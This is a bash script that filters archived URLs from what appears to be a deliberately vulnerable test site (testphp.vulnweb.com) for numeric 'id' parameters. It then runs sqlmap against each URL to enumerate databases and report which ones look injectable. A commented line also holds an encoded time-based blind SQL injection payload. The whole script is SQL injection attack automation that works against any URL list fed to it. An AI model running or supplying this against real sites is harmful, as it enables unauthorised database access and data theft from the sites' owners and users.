#!/bin/bash

x=1
i=1
rm ip_param_url.txt #done to remove the old ip parameter file

while read -r ln; do
        if echo "$ln" | grep -q -E "\?id=[0-9]{1,5}$" ;then #done to store the urls with the vuln parameter
                ((x++))
                echo "$ln" >> ip_param_url.txt
        fi
((i++))
done < test.txt
#-------> got using this cmd -> echo "http://testphp.vulnweb.com/login.php" | waybackurls | tee test.txt <--------

#echo "http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20AND%202669%3DBENCHMARK%285000000%2CMD5%280x4a62416c%29%29" >>  ip_param_url.txt
# ------------commented the above line as that was overiding the ip_param_url file info ------------

while read -r a; do
echo "line value is: $a"
        if echo y | sqlmap -u "$a" -dbs | grep -q -Ei "critical|error" ; then
                echo "wrong parameter url man check the url once again"
        else
                echo -e "\e[31m this url with parameter might work\e[0m"
        fi
done < ip_param_url.txt
